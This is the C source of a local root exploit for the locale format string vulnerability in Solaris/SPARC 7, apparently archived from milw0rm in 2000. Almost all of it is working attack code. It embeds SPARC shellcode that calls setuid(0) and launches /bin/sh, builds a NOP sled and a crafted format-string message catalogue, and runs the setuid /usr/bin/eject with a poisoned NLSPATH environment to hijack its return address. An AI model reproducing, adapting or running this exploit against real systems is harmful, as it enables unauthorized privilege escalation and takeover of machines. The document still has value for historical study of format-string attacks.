/*
   Exploit for the locale format string vulnerability in Solaris/SPARC 2.7 / 7
   Based on the exploit by Warning3 <warning3@nsfocus.com>

   For additional information see http://www.phreedom.org/solar/locale_sol.txt

   By Solar Eclipse <solareclipse@phreedom.org>
   Assistant Editor,
   Phreedom Magazine
   http://www.phreedom.org

   10 Oct 2000
*/

#include <stdio.h>
#include <sys/systeminfo.h>

#define NUM     98          /* default number of words to dump from the stack */
#define ALIGN   3           /* default align (can be 0, 1, 2, 3) */
#define RETLOCOFS -16       /* default offset of the return address location */
#define SHELLOFS -6         /* default offset of the jump location from the beginning of the shell buffer */
#define RETLOC  0xfffffffd

#define PATTERN 1024        /* format string buffer size */
#define SHELL   1024        /* shell buffer size */

#define NOP     0xac15a16e

#define VULPROG "/usr/bin/eject"

char shellcode[] =      /* from scz's funny shellcode for SPARC */
    "\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"  /* setuid(0)  */
    "\xaa\x1d\x40\x15\x90\x05\x60\x01\x92\x10\x20\x09"  /* dup2(1,2)  */
    "\x94\x05\x60\x02\x82\x10\x20\x3e\x91\xd0\x20\x08"
    "\x20\x80\x49\x73\x20\x80\x62\x61\x20\x80\x73\x65\x20\x80\x3a\x29"
    "\x7f\xff\xff\xff\x94\x1a\x80\x0a\x90\x03\xe0\x34\x92\x0b\x80\x0e"
    "\x9c\x03\xa0\x08\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\xc0\x2a\x20\x07"
    "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
    "\x91\xd0\x20\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff";

/* get current stack point address */

long get_sp(void)
{
    __asm__("mov %sp,%i0");
}

/* prints a long to a string */

char* put_long(char* ptr, long value)
{
    *ptr++ = (char) (value >> 24) & 0xff;
    *ptr++ = (char) (value >> 16) & 0xff;
    *ptr++ = (char) (value >> 8) & 0xff;
    *ptr++ = (char) (value >> 0) & 0xff;

    return ptr;
}

/* check if a long contains zero bytes */

int contains_zero(long value)
{
    return !((value & 0x00ffffff) &&
             (value & 0xff00ffff) &&
             (value & 0xffff00ff) &&
             (value & 0xffffff00));

}

/* create the shell buffer */

void create_shellbuf(char* shellbuf, int align, int retloc)
{
    char *ptr;
    int i;

    /* check align parameter */

    if (align < 0 || align > 3) {
        printf("Error: align is %d, it should be between 0 and 3\n", align);
        exit(1);
    }

    /* check retloc parameter */

    if (contains_zero(retloc) || contains_zero(retloc+2) ) {
        printf("Error: retloc (0x%x) or retloc+2 (0x%x) contains a zero byte\n", retloc, retloc+2);
        exit(1);
    }

    /* start constructing the shell buffer */

    ptr = shellbuf;

    for (i = 0; i < align; i++) {
        *ptr++ = 0x41;      /* alignment padding */
    }

    ptr = put_long(ptr, 0x42424242);        /* this is used by the %u format specifier */

    ptr = put_long(ptr, retloc);            /* put the address of the low order half-word of the return
                                               address on the stack */

    ptr = put_long(ptr, 0x42424242);        /* this is used by the %u format specifier */

    ptr = put_long(ptr, retloc + 2);        /* put the address of the high order half-word of the
                                               return address on the stack */

    /* fill the shellbuf with NOP instructions but leave enough space for the shell code */

    while ((long)ptr + 4 + strlen(shellcode) + 1 < (long)shellbuf + SHELL) {
        ptr = put_long(ptr, NOP);
    }

    memcpy(ptr, shellcode, strlen(shellcode));      /* copy the shellcode */
    ptr = ptr + strlen(shellcode);

    /* add additional padding to the shell buffer to make sure its size is always the same */

    while ((long)ptr < (long)shellbuf + SHELL - 1) {
        *ptr++ = 0x41;
    }

    *ptr = 0;                               /* null-terminate */

    /* at this point the shell buffer should be exactly SHELL bytes long, including the null-terminator */

    if (strlen(shellbuf) + 1 != SHELL) {
        printf("Error: The shell buffer is %d bytes long. It should be %d bytes. Something went terribly wrong...\n",
                strlen(shellbuf)+1, SHELL);
        exit(1);
    }

    return;
}

/* execute the vulnerable program using our custom environment */

void execute_vulnprog(char* pattern, char* shellbuf)
{
    char *env[3];
    FILE *fp;

    /* create message files */

    if (strlen(pattern) > 512) {
        printf("Warning: The pattern is %d bytes long. Only the first 512 bytes will be used.\n", strlen(pattern));
    }

    if ( !(fp = fopen("messages.po", "w+")) ) {
        perror("Error openning messages.po for writing.");
        exit(1);
    }

    fprintf(fp, "domain \"messages\"\n");
    fprintf(fp, "msgid  \"usage: %%s [-fndq] [name | nickname]\\n\"\n");
    fprintf(fp, "msgstr \"%s\\n\"", pattern);
    fclose(fp);

    system("/usr/bin/msgfmt messages.po");
    system("cp messages.mo SUNW_OST_OSCMD");
    system("cp messages.mo SUNW_OST_OSLIB");

    /* prepere the environment for the VULNPROG process */

    env[0] = "NLSPATH=:.";
    env[1] = shellbuf;              /* put the shellbuf in env */
    env[2] = NULL;                  /* end of env */

    /* execute the vulnerable program using our custom environment */

    execle(VULPROG, VULPROG, "-x", NULL, env);
}


/* print the program usage */

void usage(char *prg)
{
    printf("Usage:\n");
    printf("    %s [command] [options]\n\n", prg);
    printf("Commands:\n");
    printf("  dump                   Dumps the stack\n");
    printf("  shell                  Dumps the shell buffer\n");
    printf("  exploit                Exploits /usr/bin/eject\n\n");
    printf("Options:\n");
    printf("  --num=96               Number of words to dump from the stack\n");
    printf("  --align=2              Sets the alignment (0, 1, 2 or 3)\n");
    printf("  --shellofs=-6          Offset of the shell buffer\n");
    printf("  --retlocofs=-4         Retloc adjustment (must be divisible by 4)\n");
    printf("  --retloc=0xeffffa3c    Location of the return address\n");

    exit(0);
}

/* main */

main(int argc, char **argv)
{
    char shellbuf[SHELL], pattern[PATTERN], platform[256];
    char *ptr;
    long sp_addr, sh_addr, jmp_addr, reth, retl;
    int num = NUM, align = ALIGN, shellofs = SHELLOFS, retlocofs = RETLOCOFS, retloc = RETLOC;
    int i;

    int dump = 0, shell = 0, exploit = 0;

    /* read the exploit arguments */

    if (argc < 2) {
        usage(argv[0]);
    }

    if (!strncmp(argv[1], "dump", 4)) { dump = 1; }
    else if(!strncmp(argv[1], "shell", 5)) { shell = 1; }
    else if(!strncmp(argv[1], "exploit", 7)) { exploit = 1; }
    else {
        usage(argv[0]);
    }

    for (i = 2; i < argc; i++) {
        if ( (sscanf(argv[i], "--align=%d", &align) ||
              sscanf(argv[i], "--num=%d", &num) ||
              sscanf(argv[i], "--shellofs=%d", &shellofs) ||
              sscanf(argv[i], "--retlocofs=%d", &retlocofs) ||
              sscanf(argv[i], "--retloc=%x", &retloc))== 0) {
                printf("Unrecognized option %s\n\n", argv[i]);
                usage(argv[0]);
            }
    }

    /* create the shell buffer */

    create_shellbuf(shellbuf, align, retloc);

    /* calculate memory addresses */

    sysinfo(SI_PLATFORM, platform, 256);            /* get platform info  */

    sp_addr = (get_sp() | 0xffff) & 0xfffffffc;     /* get stack bottom address */
    sh_addr = sp_addr - (strlen(VULPROG)+1) - (strlen(platform)+1) - (strlen(shellbuf)+1) + shellofs;

    /* sh_add now points to the beginning of the shell buffer */

    printf("Calculated shell buffer address: 0x%x\n", sh_addr);

    if (shell == 1) {
        put_long(&shellbuf[align], sh_addr);        /* put sh_addr on the stack */
    }

    if ( ((sh_addr + align) & 0xfffffffc) != (sh_addr + align) ) {
        printf("Warning: sh_addr + align must be word aligned. Adjust shellofs and align as neccessary\n");
    }

    if (retloc == RETLOC) {                         /* if retloc was not specified on the command line, calculate it */
        retloc = sh_addr + align - num*4 + retlocofs;
        printf("Calculated retloc: 0x%x\n", retloc);

        put_long(&shellbuf[align+4], retloc);
        put_long(&shellbuf[align+12], retloc+2);
    }

    jmp_addr = (sh_addr + align) + 64;              /* Calculate the shell jump location */
    printf("Calculated shell code jump location: 0x%x\n\n", jmp_addr);

    /* create the format string */

    ptr = pattern;
    for (i = 0; i < num; i++) {
        memcpy(ptr, "%.8x", 4);
        ptr = ptr + 4;
    }

    if (dump == 1) {
        *ptr = 0;                                   /* null-terminate */
        printf("Stack dump mode, dumping %d words\n", num);
    }
    else if (shell == 1) {
        sprintf(ptr, " Shell buffer: %%s");

        printf("shellbuf (length = %d): %s\n\n", strlen(shellbuf)+1, shellbuf);
        printf("Shell buffer dump mode, shell buffer address is 0x%x\n", sh_addr);
    }
    else {
        reth = (jmp_addr >> 16) & 0xffff;
        retl = (jmp_addr >> 0) & 0xffff;

        sprintf(ptr, "%%%uc%%hn%%%uc%%hn", (reth - num * 8), (retl - reth));
        printf("Exploit mode, jumping to 0x%x\n", jmp_addr);
    }

    printf("num: %d\t\talign: %d\tshellofs: %d\tretlocofs: %d\tretloc: 0x%x\n\n",
            num, align, shellofs, retlocofs, retloc);

    /* execute the vulnerable program using our custom environment */

    execute_vulnprog(pattern, shellbuf);

}


// milw0rm.com [2000-11-20]